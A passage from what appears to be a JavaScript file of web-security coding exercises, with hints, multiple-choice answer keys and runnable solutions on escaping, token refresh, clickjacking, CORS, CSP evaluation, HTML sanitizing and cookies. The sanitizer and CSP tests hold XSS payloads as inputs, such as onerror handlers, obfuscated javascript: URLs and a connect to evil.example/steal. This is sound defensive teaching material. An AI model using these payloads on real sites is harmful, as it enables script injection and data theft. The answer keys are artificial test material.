      if (/[A-Za-z0-9 ]/.test(ch)) out += ch;                                   // safe allowlist
      else if (code < 256) out += BS + 'x' + pad(code.toString(16), 2);
      else out += BS + 'u' + pad(code.toString(16), 4);
    }
    return out;
  }
  if (ctx === 'url') {
    return encodeURIComponent(s).replace(/[!'()*]/g, function (c) { return '%' + c.charCodeAt(0).toString(16).toUpperCase(); });
  }
  throw new Error('unknown context: ' + ctx);
}

console.log(escapeForContext('<b>&', 'html'));
console.log(escapeForContext('"x" onfocus="y', 'attr'));
console.log(escapeForContext("a'; alert(1);//", 'js'));
console.log(escapeForContext('a b&c=d (x)', 'url'));
try { escapeForContext('x', 'css'); } catch (e) { console.log('error: ' + e.message); }` },
    dry: { head: ['value', 'ctx', 'char', 'output piece'], rows: [["a'", 'js', "'", 'x27'], ['a b', 'url', 'space', '%20'], ['"', 'attr', '"', '&quot;']] },
    complexity: `<p>Linear time, O(n) in the value length, per call.</p>`,
    followUps: ['Why is there no safe generic escaper for CSS or for whole URLs?', 'How do templating engines pick the escaper automatically?']
  }
});

/* ---- practice part 2 ---- */
practice.push({
  title: "Single-Flight Token Refresh", level: "Medium", tags: ["auth", "async", "race conditions"], companies: ["Netflix", "Slack"],
  statement: `<p>Write <code>createAuthClient(refreshFn, sendFn, initialToken)</code> returning <code>{ request(path), stats() }</code>. <code>request</code> sends with the current token; if the response status is 401 it refreshes the token and retries <b>once</b>. When many requests get 401 at the same time, <code>refreshFn</code> must be called only <b>once</b> (they all share one in-flight promise). A request that was sent with an old token must not trigger a second refresh if another request already refreshed. <code>stats()</code> returns <code>{ refreshCalls }</code>.</p>`,
  constraints: `<code>refreshFn()</code> returns a Promise of a token; <code>sendFn(path, token)</code> returns a Promise of <code>{status, body}</code>.`,
  example: `<p>Three parallel requests with an expired token: all get 401, <b>one</b> refresh call runs, all three retry and succeed. <code>stats().refreshCalls === 1</code>.</p><p>Why: with refresh-token rotation, a second parallel refresh would reuse a spent token and the server would log the user out as suspected theft.</p>`,
  brute: {
    why: `<p>Calling <code>refreshFn()</code> in every 401 handler fires N refreshes at once. With rotating refresh tokens, N-1 of them present an already used token, which servers treat as theft and revoke the whole session.</p>`,
    code: String.raw`async function requestBrute(path, getToken, refresh, send) {
  var res = await send(path, getToken());
  if (res.status === 401) { await refresh(); res = await send(path, getToken()); }  // every caller refreshes
  return res;
}`
  },
  mcq: { q: "When 5 requests fail with 401 at once, how many refresh calls should be sent?", options: ["5, one each", "1, shared by all of them", "0, just log out", "2, one per tab"], answer: 1, explain: "One shared in-flight promise avoids refresh-token reuse, which servers treat as a theft signal." },
  hints: [`<p>Hint 1: The problem is concurrency: many callers need the same new token, so they should wait on the same Promise.</p>`,
    `<p>Hint 2: Keep a variable <code>inflight</code>. If it is null create it from <code>refreshFn()</code> and clear it in <code>finally</code>; otherwise return it.</p>`,
    `<p>Hint 3: Remember the token each request used. After a 401, only refresh if the current token is still that same old token; otherwise another request already refreshed, so just retry.</p>`],
  solution: {
    approach: `<p>One shared promise (single-flight) plus a check of which token the failing request carried. Retry only once to avoid loops when the refresh token itself is dead.</p>`,
    code: { lang: 'js', run: true, code: String.raw`function createAuthClient(refreshFn, sendFn, initialToken) {
  var token = initialToken || null;
  var inflight = null;       // the ONE refresh promise everybody shares
  var refreshCalls = 0;

  function refresh() {
    if (!inflight) {
      refreshCalls++;
      inflight = refreshFn()
        .then(function (t) { token = t; return t; })
        .finally(function () { inflight = null; });
    }
    return inflight;
  }

  async function request(path) {
    if (!token) await refresh();
    var used = token;                                  // remember which token this request carried
    var res = await sendFn(path, used);
    if (res.status === 401) {
      // If another request already refreshed while we were waiting, just retry with the new token.
      if (token === used) await refresh();
      res = await sendFn(path, token);
    }
    return res;
  }

  return { request: request, stats: function () { return { refreshCalls: refreshCalls }; } };
}

var clock = 0;
function refreshFn() { return new Promise(function (resolve) { setTimeout(function () { resolve('new-token'); }, 20); }); }
function sendFn(path, token) {
  return new Promise(function (resolve) {
    setTimeout(function () { resolve(token === 'new-token' ? { status: 200, body: path } : { status: 401 }); }, 5);
  });
}

(async function () {
  var client = createAuthClient(refreshFn, sendFn, 'old-token');
  var results = await Promise.all([client.request('/a'), client.request('/b'), client.request('/c')]);
  console.log(results.map(function (r) { return r.status; }).join(','), JSON.stringify(client.stats()));
  var late = await client.request('/d');
  console.log(late.status, JSON.stringify(client.stats()));
})();
` },
    dry: { head: ["event", "refreshFn calls"], rows: [["/a,/b,/c all 401", "1 (shared)"], ["retries", "all 200"], ["/d later with new token", "0 more"]] },
    complexity: `<p>O(1) extra work per request; one refresh per expiry.</p>`,
    followUps: ["How do multiple browser tabs coordinate (Web Locks, BroadcastChannel)?", "What do you do when the refresh itself returns 401?"]
  }
});

practice.push({
  title: "Can This Page Be Framed? (Clickjacking Check)", level: "Medium", tags: ["clickjacking", "frame-ancestors", "X-Frame-Options"], companies: ["Dropbox", "PayPal"],
  statement: `<p>Write <code>canBeFramed(headers, ancestors, selfOrigin)</code>. <code>ancestors</code> is the list of origins of every page above the frame (parent, grandparent, ...). If a <code>Content-Security-Policy</code> header has a <code>frame-ancestors</code> directive, only it counts (X-Frame-Options is then ignored): <code>'none'</code> forbids all; sources may be <code>'self'</code>, <code>*</code>, a scheme like <code>https:</code>, an exact origin, or <code>https://*.partner.example</code>; <b>every</b> ancestor must match some source. Without it, <code>X-Frame-Options: DENY</code> forbids all and <code>SAMEORIGIN</code> allows only ancestors equal to <code>selfOrigin</code>. With neither header, framing is allowed.</p>`,
  constraints: `Header names are case-insensitive. At most 10 ancestors.`,
  example: `${H.table(['Headers','Ancestors','Result'],[['(none)','evil.example',H.c('r','allowed: unprotected')],['X-Frame-Options: DENY','self',H.c('g','blocked')],['CSP frame-ancestors partner','partner, evil',H.c('g','blocked: evil is not listed')],['CSP none + XFO SAMEORIGIN','self',H.c('g','blocked: CSP wins')]])}`,
  brute: {
    why: `<p>Checking only <code>X-Frame-Options</code> misses the modern header and the ancestor chain: a page framed by a trusted partner that is itself framed by an attacker would pass a parent-only check.</p>`,
    code: String.raw`function framedBrute(headers, parent, self) {
  // Looks only at X-Frame-Options and only at the direct parent
  var xfo = headers['X-Frame-Options'];
  return xfo !== 'DENY' && (xfo !== 'SAMEORIGIN' || parent === self);
}`
  },
  mcq: { q: "Which header should you rely on for clickjacking protection today?", options: ["X-Frame-Options only", "CSP frame-ancestors (plus X-Frame-Options for old browsers)", "A JavaScript frame buster only", "Referrer-Policy"], answer: 1, explain: "frame-ancestors is the standard, supports lists and checks the whole chain; X-Frame-Options is the legacy fallback." },
  hints: [`<p>Hint 1: Lower-case the header names first, then look for the CSP header and its frame-ancestors directive.</p>`,
    `<p>Hint 2: If frame-ancestors exists, decide using only it and stop; do not look at X-Frame-Options.</p>`,
    `<p>Hint 3: Write a small <code>matchSource(src, origin, selfOrigin)</code> and use <code>ancestors.every(a =&gt; sources.some(s =&gt; matchSource(s, a, self)))</code>.</p>`],
  solution: {
    approach: `<p>Precedence (CSP over XFO), then an all-ancestors check with a tiny source matcher.</p>`,
    code: { lang: 'js', run: true, code: String.raw`function matchSource(src, origin, selfOrigin) {
  if (src === "'self'") return origin === selfOrigin;
  if (src === '*') return true;
  if (src.charAt(src.length - 1) === ':') return origin.indexOf(src) === 0;            // scheme source, e.g. https:
  if (src.indexOf('*.') === 0 || src.indexOf('://*.') !== -1) {                          // wildcard subdomain
    var suffix = src.slice(src.indexOf('*.') + 1);                                     // ".example.com"
    var host = origin.replace(/^[a-z]+:\/\//i, '').replace(/:\d+$/, '');
    var schemeOk = src.indexOf('://') === -1 || origin.indexOf(src.slice(0, src.indexOf('://') + 3)) === 0;
    return schemeOk && host.length > suffix.length && host.slice(-suffix.length) === suffix;
  }
  return src === origin;                                                               // exact origin
}

function canBeFramed(headers, ancestors, selfOrigin) {
  var h = {};
  Object.keys(headers).forEach(function (k) { h[k.toLowerCase()] = String(headers[k]); });
  var csp = h['content-security-policy'];
  if (csp) {
    var dirs = csp.split(';').map(function (d) { return d.trim(); });
    for (var i = 0; i < dirs.length; i++) {
      var parts = dirs[i].split(/\s+/);
      if (parts[0].toLowerCase() !== 'frame-ancestors') continue;
      var sources = parts.slice(1);
      if (sources.length === 0 || (sources.length === 1 && sources[0] === "'none'")) return false;
      // EVERY ancestor (parent, grandparent, ...) must be allowed
      return ancestors.every(function (a) {
        return sources.some(function (s) { return matchSource(s, a, selfOrigin); });
      });
    }
  }
  var xfo = (h['x-frame-options'] || '').trim().toUpperCase();
  if (xfo === 'DENY') return false;
  if (xfo === 'SAMEORIGIN') return ancestors.every(function (a) { return a === selfOrigin; });
  return true;                                           // no framing protection at all
}

var self = 'https://bank.example';
console.log(canBeFramed({}, ['https://evil.example'], self));
console.log(canBeFramed({ 'X-Frame-Options': 'DENY' }, [self], self));
console.log(canBeFramed({ 'X-Frame-Options': 'SAMEORIGIN' }, [self], self));
console.log(canBeFramed({ 'Content-Security-Policy': "default-src 'self'; frame-ancestors 'self' https://partner.example" }, ['https://partner.example'], self));
console.log(canBeFramed({ 'Content-Security-Policy': "frame-ancestors 'self' https://partner.example" }, ['https://partner.example', 'https://evil.example'], self));
console.log(canBeFramed({ 'Content-Security-Policy': "frame-ancestors 'none'", 'X-Frame-Options': 'SAMEORIGIN' }, [self], self));
console.log(canBeFramed({ 'Content-Security-Policy': "frame-ancestors https://*.partner.example", 'X-Frame-Options': 'DENY' }, ['https://shop.partner.example'], self));
console.log(canBeFramed({ 'Content-Security-Policy': "frame-ancestors https://*.partner.example" }, ['https://partner.example'], self));
` },
    dry: { head: ["case", "decision"], rows: [["no headers", "true"], ["XFO DENY", "false"], ["CSP lists partner, chain has evil", "false"]] },
    complexity: `<p>O(A * S) for A ancestors and S sources.</p>`,
    followUps: ["Why do login pages usually use 'none'?", "How do you let one partner embed a widget safely?"]
  }
});

practice.push({
  title: "Count the Preflight Requests (Max-Age Cache)", level: "Medium", tags: ["CORS", "preflight", "caching"], companies: ["Google", "Shopify"],
  statement: `<p>Write <code>preflightCount(events, maxAge)</code>. Each event is <code>{ t, origin, url, credentials, preflight }</code> in time order (seconds). Events with <code>preflight: false</code> are simple requests and send no OPTIONS. Otherwise the browser looks up a cache entry keyed by <b>origin + url + credentials flag</b>; a hit (current time earlier than expiry) sends no OPTIONS, a miss sends one and stores an entry for <code>ttl</code> seconds. <code>ttl</code> is 5 when <code>maxAge</code> is undefined, otherwise <code>maxAge</code> capped at 7200; a ttl of 0 means no caching. Return how many OPTIONS requests were sent.</p>`,
  constraints: `Up to 10<sup>5</sup> events.`,
  example: `<p>Six requests to the same URL at t = 0, 1, 2, 6, 7, 100: default ttl 5 gives <b>3</b> OPTIONS (t=0, 6, 100); <code>maxAge=600</code> gives <b>1</b>; <code>maxAge=0</code> gives <b>6</b>.</p><p>Why: at t=6 the 5-second entry from t=0 has expired.</p>`,
  brute: {
    why: `<p>Assuming one OPTIONS per page load, or one per origin, ignores that the cache key includes the full URL: <code>/orders/1</code> and <code>/orders/2</code> are separate entries.</p>`,
    code: String.raw`function countBrute(events) {
  // Wrong: counts every preflight-needing request as a new OPTIONS
  return events.filter(function (e) { return e.preflight; }).length;
}`
  },
  mcq: { q: "An API uses /orders/1, /orders/2, /orders/3 with max-age 600. How many preflights?", options: ["1", "3, the cache is keyed per URL", "0", "600"], answer: 1, explain: "Each distinct URL has its own preflight cache entry, so design stable URLs or use a same-origin gateway." },
  hints: [`<p>Hint 1: This is a cache simulation: a map from key to expiry time.</p>`,
    `<p>Hint 2: Build the key as origin + '|' + url + '|' + credentials. Skip events that need no preflight without touching the map.</p>`,
    `<p>Hint 3: Hit means <code>t &lt; expiry</code>. On a miss increment the counter and, if ttl is positive, set expiry to <code>t + ttl</code>.</p>`],
  solution: {
    approach: `<p>Hash map keyed by the spec's cache key with an expiry time; one pass over the events.</p>`,
    code: { lang: 'js', run: true, code: String.raw`function preflightCount(events, maxAge) {
  var ttl = maxAge === undefined ? 5 : Math.min(maxAge, 7200);     // browsers: default 5 s, Chromium caps at 2 h
  var cache = {};                                                  // key -> expiry time in seconds
  var options = 0;
  events.forEach(function (e) {
    if (!e.preflight) return;                                      // simple request: no OPTIONS, cache untouched
    var key = e.origin + '|' + e.url + '|' + (e.credentials ? 'cred' : 'nocred');
    if (cache[key] !== undefined && e.t < cache[key]) return;      // cache hit
    options++;                                                     // cache miss: send OPTIONS
    if (ttl > 0) cache[key] = e.t + ttl;
  });
  return options;
}
var ev = [0, 1, 2, 6, 7, 100].map(function (t) { return { t: t, origin: 'https://app.example', url: '/orders', credentials: false, preflight: true }; });
console.log(preflightCount(ev), preflightCount(ev, 600), preflightCount(ev, 0));
var many = [1, 2, 3].map(function (i) { return { t: i, origin: 'https://app.example', url: '/orders/' + i, credentials: false, preflight: true }; });
console.log(preflightCount(many, 600));
console.log(preflightCount([{ t: 0, origin: 'o', url: '/u', credentials: false, preflight: false }, { t: 1, origin: 'o', url: '/u', credentials: true, preflight: true }, { t: 2, origin: 'o', url: '/u', credentials: false, preflight: true }], 600));
` },
    dry: { head: ["t", "cache", "OPTIONS?"], rows: [["0", "miss", "yes (expires 5)"], ["1, 2", "hit", "no"], ["6", "expired", "yes"]] },
    complexity: `<p>O(n) time, O(distinct keys) space.</p>`,
    followUps: ["How would you add the method and header lists to the cache key?", "Why can a CDN or gateway at the same origin remove this cost entirely?"]
  }
});

practice.push({
  title: "Mini CSP Evaluator", level: "Hard", tags: ["CSP", "parsing", "nonce", "strict-dynamic"], companies: ["Google", "Cloudflare"],
  statement: `<p>Write <code>cspAllows(policyText, res, pageOrigin)</code> returning true when the browser would load/run resource <code>res</code>. <code>res</code> has <code>type</code> (<code>script</code>, <code>style</code>, <code>img</code>, <code>connect</code>, <code>frame</code>) and one of: <code>url</code>; <code>inline: true</code> (optionally <code>nonce</code>, <code>hash</code>, or <code>handler: true</code> for onclick attributes); <code>eval: true</code>. Also <code>byTrustedScript</code> for scripts created by a trusted script. Rules: first occurrence of a directive wins; fallbacks are script/style/img/connect to <code>default-src</code>, frame to <code>frame-src</code>, <code>child-src</code>, then <code>default-src</code>; no applicable directive means allowed; a lone <code>'none'</code> blocks all. Sources: <code>*</code>, <code>'self'</code>, schemes like <code>data:</code>, hosts with optional scheme and <code>*.</code> wildcard, nonces, hashes, <code>'unsafe-inline'</code> (ignored when a nonce or hash is present), <code>'unsafe-eval'</code>, <code>'strict-dynamic'</code> (script only: host and scheme sources are ignored; only nonce or <code>byTrustedScript</code> allows). Inline handlers need an effective <code>'unsafe-inline'</code>.</p>`,
  constraints: `Ports and paths in sources are not required. Up to 20 directives.`,
  example: `<p>Policy: <code>script-src 'nonce-abc' 'strict-dynamic' https://cdn.example.com; img-src 'self' data:</code></p>${H.table(['Resource','Result'],[['inline script nonce abc',H.c('g','allowed')],['inline script without nonce',H.c('r','blocked')],['onclick handler',H.c('r','blocked')],['script from cdn.example.com (not trusted-created)',H.c('r','blocked: strict-dynamic ignores hosts')],['data: image',H.c('g','allowed')]])}`,
  brute: {
    why: `<p>Matching by substring (<code>policy.includes(host)</code>) ignores directive scoping and fallbacks: a host listed in <code>img-src</code> would wrongly allow scripts, and <code>'unsafe-inline'</code> next to a nonce would be honoured though browsers ignore it.</p>`,
    code: String.raw`function cspBrute(policy, res) {
  // Substring matching: ignores directives, fallbacks and keyword rules
  return res.url ? policy.indexOf(new URL(res.url, 'https://x').hostname) !== -1 : policy.indexOf("'unsafe-inline'") !== -1;
}`
  },
  mcq: { q: "A script-src has a nonce AND 'unsafe-inline'. Does an injected inline script without a nonce run?", options: ["Yes, unsafe-inline allows it", "No, browsers ignore unsafe-inline when a nonce is present", "Only in Firefox", "Only for handlers"], answer: 1, explain: "CSP3 says unsafe-inline is ignored when a nonce or hash is present, which lets one policy work in old and new browsers." },
  hints: [`<p>Hint 1: Parse the policy into a map from directive name to source list (first wins), then pick the directive via the fallback chain.</p>`,
    `<p>Hint 2: Decide the special cases first: eval, inline (handler, nonce, hash, unsafe-inline), strict-dynamic. Only then handle URL matching.</p>`,
    `<p>Hint 3: For URLs use the URL class and loop over source tokens: <code>*</code>, <code>'self'</code> (origin equality), scheme tokens ending with colon, then host tokens with optional scheme and <code>*.</code> wildcard.</p>`],
  solution: {
    approach: `<p>A small rules engine mirroring how browsers resolve a CSP: directive lookup with fallbacks, then keyword rules, then URL source matching.</p>`,
    code: { lang: 'js', run: true, code: String.raw`var FALLBACK = {
  script: ['script-src', 'default-src'],
  style: ['style-src', 'default-src'],
  img: ['img-src', 'default-src'],
  connect: ['connect-src', 'default-src'],
  frame: ['frame-src', 'child-src', 'default-src']
};

function parsePolicy(text) {
  var pol = {};
  text.split(';').forEach(function (d) {
    var t = d.trim().split(/\s+/).filter(Boolean);
    if (t.length && !(t[0].toLowerCase() in pol)) pol[t[0].toLowerCase()] = t.slice(1);   // first occurrence wins
  });
  return pol;
}

function hostMatches(token, u) {
  var t = token;
  var scheme = null;
  var m = /^([a-z][a-z0-9+.-]*):\/\//i.exec(t);
  if (m) { scheme = m[1].toLowerCase() + ':'; t = t.slice(m[0].length); }
  t = t.replace(/\/.*$/, '');                                   // paths are not supported here
  if (scheme && scheme !== u.protocol) return false;
  if (t.indexOf('*.') === 0) {
    var suffix = t.slice(1);                                    // ".example.com"
    return u.hostname.length > suffix.length && u.hostname.slice(-suffix.length) === suffix.toLowerCase();
  }
  return t.toLowerCase() === u.hostname;
}

function cspAllows(policyText, res, pageOrigin) {
  var pol = parsePolicy(policyText);
  var chain = FALLBACK[res.type] || [];
  var list = null;
  for (var i = 0; i < chain.length && !list; i++) if (pol[chain[i]]) list = pol[chain[i]];
  if (!list) return true;                                       // no directive applies: unrestricted
  if (list.length === 1 && list[0].toLowerCase() === "'none'") return false;

  var has = function (x) { return list.indexOf(x) !== -1; };
  var hasNonceOrHash = list.some(function (x) { return /^'(nonce|sha256|sha384|sha512)-/i.test(x); });
  var strict = res.type === 'script' && has("'strict-dynamic'");

  if (res.eval) return has("'unsafe-eval'");
  if (res.inline) {
    if (res.handler) return has("'unsafe-inline'") && !hasNonceOrHash;      // nonces never cover onclick="..."
    if (res.nonce && has("'nonce-" + res.nonce + "'")) return true;
    if (res.hash && has("'" + res.hash + "'")) return true;
    return has("'unsafe-inline'") && !hasNonceOrHash;                       // ignored when nonce/hash present
  }
  if (strict) {
    if (res.byTrustedScript) return true;                                   // loaded by a nonced script
    if (res.nonce && has("'nonce-" + res.nonce + "'")) return true;
    return false;                                                           // host sources are ignored
  }
  var u = new URL(res.url, pageOrigin);
  for (var j = 0; j < list.length; j++) {
    var tok = list[j];
    var low = tok.toLowerCase();
    if (low === '*') { if (u.protocol === 'http:' || u.protocol === 'https:' || u.protocol === 'ws:' || u.protocol === 'wss:') return true; continue; }
    if (low === "'self'") { if (u.origin === pageOrigin) return true; continue; }
    if (tok.charAt(0) === "'") continue;                                    // other keywords
    if (low.charAt(low.length - 1) === ':') { if (u.protocol === low) return true; continue; }   // scheme source
    if (hostMatches(tok, u)) return true;
  }
  return false;
}

var P = "default-src 'self'; script-src 'nonce-abc123' 'strict-dynamic' https://cdn.example.com; img-src 'self' data: *.imgs.example; connect-src https://api.example.com; object-src 'none'";
var O = 'https://app.example.com';
var tests = [
  [{ type: 'script', inline: true, nonce: 'abc123' }, true],
  [{ type: 'script', inline: true }, false],
  [{ type: 'script', inline: true, handler: true }, false],
  [{ type: 'script', url: '/app.js', nonce: 'abc123' }, true],
  [{ type: 'script', url: 'https://cdn.example.com/lib.js' }, false],
  [{ type: 'script', url: 'https://evil.example/x.js', byTrustedScript: true }, true],
  [{ type: 'img', url: 'https://app.example.com/a.png' }, true],
  [{ type: 'img', url: 'data:image/png;base64,AAAA' }, true],
  [{ type: 'img', url: 'https://cdn.imgs.example/p.png' }, true],
  [{ type: 'img', url: 'https://imgs.example/p.png' }, false],
  [{ type: 'connect', url: 'https://api.example.com/v1' }, true],
  [{ type: 'connect', url: 'https://evil.example/steal' }, false],
  [{ type: 'script', eval: true }, false],
  [{ type: 'style', inline: true }, false],
  [{ type: 'frame', url: 'https://www.youtube.com/embed/x' }, false]
];
tests.forEach(function (t) { var r = cspAllows(P, t[0], O); console.log((r === t[1] ? 'ok  ' : 'FAIL') + ' ' + JSON.stringify(t[0]) + ' -> ' + r); });
console.log(cspAllows("script-src 'self' 'unsafe-inline'", { type: 'script', inline: true }, O), cspAllows("script-src 'self' 'unsafe-inline' 'nonce-x'", { type: 'script', inline: true }, O), cspAllows("script-src 'self'", {type:'script', url:'https://app.example.com/a.js'}, O));
` },
    dry: { head: ["resource", "directive", "verdict"], rows: [["inline nonce abc", "script-src", "allowed"], ["cdn script", "script-src (strict-dynamic)", "blocked"], ["data: image", "img-src", "allowed"]] },
    complexity: `<p>O(S) per resource for S sources after O(P) policy parsing.</p>`,
    followUps: ["Add report-only mode and violation reports.", "Add hash sources computed from the script text with crypto.subtle."]
  }
});

practice.push({
  title: "Write a Tiny HTML Sanitizer", level: "Hard", tags: ["XSS", "sanitization", "parsing"], companies: ["Google", "Atlassian"],
  statement: `<p>Write <code>sanitize(html, allowed)</code> where <code>allowed</code> maps lower-case tag names to arrays of allowed attribute names, for example <code>{ a: ['href', 'title'], b: [] }</code>. Output only allowed tags, rebuilt with double-quoted, escaped attributes. Rules: text is HTML-escaped; unknown tags are dropped but their text kept; <code>script</code>, <code>style</code>, <code>iframe</code>, <code>object</code>, <code>template</code> are dropped together with their content; comments are removed; a lone <code>&lt;</code> becomes <code>&amp;lt;</code>; attributes not allowlisted (including every <code>on*</code>) are dropped; <code>href</code>/<code>src</code> must be relative or use http, https or mailto (ignore whitespace and case inside the scheme) or the attribute is dropped; links with an href get <code>rel="noopener noreferrer"</code>.</p>`,
  constraints: `Input up to 10<sup>5</sup> characters. Do not use regex on the whole document and do not rely on DOM APIs.`,
  example: `<p>Input <code>&lt;a href="javascript:alert(1)" onclick="x()"&gt;go&lt;/a&gt;&lt;script&gt;bad()&lt;/script&gt;</code> becomes <code>&lt;a&gt;go&lt;/a&gt;</code>.</p><p>Why: the dangerous href and the handler are dropped, the script element disappears with its content.</p>`,
  brute: {
    why: `<p>The usual first attempt is <code>html.replace(/&lt;script.*?&lt;\/script&gt;/gi, '')</code>. It misses <code>&lt;img onerror&gt;</code>, <code>&lt;SCRIPT &gt;</code> variants, nested or split payloads such as <code>&lt;scr&lt;script&gt;ipt&gt;</code> and javascript: URLs. Blocklists always lose; use an allowlist.</p>`,
    code: String.raw`function sanitizeBrute(html) {
  // Blocklist regex: easily bypassed (onerror, <scr<script>ipt>, javascript: URLs)
  return html.replace(/<script[^>]*>.*?<\/script>/gi, '');
}`
  },
  mcq: { q: "Why is an allowlist sanitizer safer than removing known-bad tags?", options: ["It is faster", "Unknown or future dangerous constructs are dropped by default", "It keeps more HTML", "It needs no parsing"], answer: 1, explain: "Attackers only need one construct you forgot. An allowlist drops everything you did not explicitly approve." },
  hints: [`<p>Hint 1: Walk the string with an index. Text before a '<' is escaped and copied; what starts at '<' is a comment, a tag or a lone '<'.</p>`,
    `<p>Hint 2: To find the end of a tag, scan to '>' but skip over quoted attribute values, so a '>' inside quotes does not end it.</p>`,
    `<p>Hint 3: Keep a variable skipUntil: after an opening script/style tag drop everything until its closing tag. For allowed tags rebuild the attributes yourself from an allowlist, validating href/src with a scheme check that first removes whitespace and control characters.</p>`],
  solution: {
    approach: `<p>A single-pass tokenizer plus allowlist rebuild. It never copies attacker markup through; everything emitted is reconstructed from validated pieces. (Production code should use DOMPurify, which parses with the real browser parser and defends against mutation XSS.)</p>`,
    code: { lang: 'js', run: true, code: String.raw`var ENT = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
function esc(s) { return s.replace(/[&<>"']/g, function (c) { return ENT[c]; }); }

// Undo the entities we are about to re-escape, so "&amp;" in input does not become "&amp;amp;"
// (attribute values arrive raw; we only decode the five basics to keep this tiny and predictable).
function decodeBasic(s) {
  return s.replace(/&(amp|lt|gt|quot|#39);/g, function (m, n) {
    return { amp: '&', lt: '<', gt: '>', quot: '"', '#39': "'" }[n];
  });
}

function safeUrl(v) {
  var clean = v.replace(/[\u0000- ]+/g, '');                 // browsers ignore tabs/newlines/spaces inside the scheme
  var m = /^([a-zA-Z][a-zA-Z0-9+.-]*):/.exec(clean);
  if (!m) return v.trim();                                         // relative URL
  var scheme = m[1].toLowerCase();
  return (scheme === 'http' || scheme === 'https' || scheme === 'mailto') ? v.trim() : null;
}

var DROP_CONTENT = { script: 1, style: 1, iframe: 1, object: 1, template: 1 };

function sanitize(html, allowed) {
  var out = '';
  var i = 0, n = html.length;
  var skipUntil = null;                                            // inside <script>...: drop everything until the closing tag
  while (i < n) {
    var lt = html.indexOf('<', i);
    if (lt === -1) { if (!skipUntil) out += esc(html.slice(i)); break; }
    if (!skipUntil) out += esc(html.slice(i, lt));
    // comment
    if (html.substr(lt, 4) === '<!--') {
      var endC = html.indexOf('-->', lt + 4);
      i = endC === -1 ? n : endC + 3;
      continue;
    }
    var nx = html.charAt(lt + 1);
    var isClose = nx === '/';
    var nameStart = lt + (isClose ? 2 : 1);
    if (!/[a-zA-Z]/.test(html.charAt(nameStart))) {                // a lone "<" is just text
      if (!skipUntil) out += '&lt;';
      i = lt + 1;
      continue;
    }
    // find the end of the tag, respecting quotes
    var j = nameStart, q = null;
    while (j < n) {
      var ch = html.charAt(j);
      if (q) { if (ch === q) q = null; }
      else if (ch === '"' || ch === "'") q = ch;
      else if (ch === '>') break;
      j++;
    }
    if (j >= n) { i = n; break; }                                  // unterminated tag: drop it
    var inner = html.slice(nameStart, j);                          // e.g.  a href="x" title=y
    i = j + 1;
    var nm = /^[a-zA-Z][a-zA-Z0-9-]*/.exec(inner)[0].toLowerCase();
    if (skipUntil) { if (isClose && nm === skipUntil) skipUntil = null; continue; }
    if (!isClose && DROP_CONTENT[nm]) { skipUntil = nm; continue; }
    if (!Object.prototype.hasOwnProperty.call(allowed, nm)) continue;   // unknown tag: drop the tag, keep its text
    if (isClose) { out += '</' + nm + '>'; continue; }
    // parse attributes
    var rest = inner.slice(nm.length);
    var attrRe = /([^\s"'<>\/=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>]+)))?/g;
    var m, attrs = '';
    while ((m = attrRe.exec(rest))) {
      var an = m[1].toLowerCase();
      if (allowed[nm].indexOf(an) === -1) continue;                // not allowlisted (this also kills onclick, style, ...)
      var raw = m[2] !== undefined ? m[2] : (m[3] !== undefined ? m[3] : (m[4] || ''));
      var val = decodeBasic(raw);
      if (an === 'href' || an === 'src') { val = safeUrl(val); if (val === null) continue; }
      attrs += ' ' + an + '="' + esc(val) + '"';
    }
    if (nm === 'a' && attrs.indexOf(' href=') !== -1) attrs += ' rel="noopener noreferrer"';
    out += '<' + nm + attrs + '>';
  }
  return out;
}

var ALLOWED = { a: ['href', 'title'], b: [], i: [], em: [], strong: [], p: [], ul: [], li: [], br: [], code: [] };
[
  '<p>Hello <b>world</b></p>',
  '<script>alert(1)<\/script>Hi',
  '<img src=x onerror=alert(1)>',
  '<a href="javascript:alert(1)">click</a>',
  '<a href=" JaVa\tScRiPt:alert(1)">x</a>',
  '<a href="https://example.com/?a=1&amp;b=2" onclick="evil()" title=\'T "q"\'>ok</a>',
  '5 < 7 and <3 <!-- hidden --> done',
  '<b onmouseover="x">bold</b><style>body{display:none}</style>end',
  '<unknown>text</unknown>',
  '<a href="https://x.example/"title="no-space">a</a>'
].forEach(function (h) { console.log(JSON.stringify(h) + '\n   -> ' + sanitize(h, ALLOWED)); });
` },
    dry: { head: ["input piece", "action", "output"], rows: [["&lt;script&gt;..", "drop with content", "(nothing)"], ["a href=javascript:..", "drop href", "a without href"], ["5 &lt; 7", "lone less-than", "5 &amp;lt; 7"]] },
    complexity: `<p>O(n) time and space.</p>`,
    followUps: ["Why can a hand-written sanitizer still fall to mutation XSS?", "How would you balance unclosed tags?"]
  }
});

practice.push({
  title: "Which Cookies Does the Browser Send?", level: "Hard", tags: ["cookies", "SameSite", "domain matching"], companies: ["Google", "Cloudflare"],
  statement: `<p>Write <code>cookieHeader(jar, req, publicSuffixes)</code> returning the value of the <code>Cookie</code> header the browser sends. Each cookie: <code>{name, value, domain, hostOnly, path, secure, sameSite}</code> (sameSite may be missing = Lax). The request: <code>{url, initiator, method, topLevelNav}</code>. Rules: domain match (hostOnly: exact host; otherwise host equals domain or ends with '.' + domain); path match on a boundary (cookie path <code>/a</code> matches <code>/a</code> and <code>/a/b</code> but not <code>/ab</code>); <code>secure</code> cookies only on https (or localhost); a request is cross-site when the registrable domain (last two labels, or three under a public suffix) or the scheme of target and initiator differ. For cross-site: <code>None</code> always sent, <code>Lax</code> only for GET/HEAD top-level navigations, <code>Strict</code> never. Sort by path length descending (stable). Join as <code>name=value; ...</code>.</p>`,
  constraints: `Up to 1000 cookies.`,
  example: `<p>Jar: sid (shop.com, Lax, Secure), pref (domain shop.com, None), cart (path /cart, Strict).</p>${H.table(['Request','Cookie header'],[['POST https://shop.com/cart/view from shop.com','cart=C9; sid=S1; pref=dark'],['GET https://shop.com/cart link click from blog.example','sid=S1; pref=dark'],['POST same from blog.example','pref=dark'],['http://shop.com/','pref=dark']])}`,
  brute: {
    why: `<p>Sending every cookie whose domain matches ignores path boundaries, Secure and SameSite, and also mishandles host-only cookies (sent to subdomains by mistake).</p>`,
    code: String.raw`function cookiesBrute(jar, host) {
  // Only checks the domain suffix: ignores path, Secure, SameSite and host-only
  return jar.filter(function (c) { return host.endsWith(c.domain); }).map(function (c) { return c.name + '=' + c.value; }).join('; ');
}`
  },
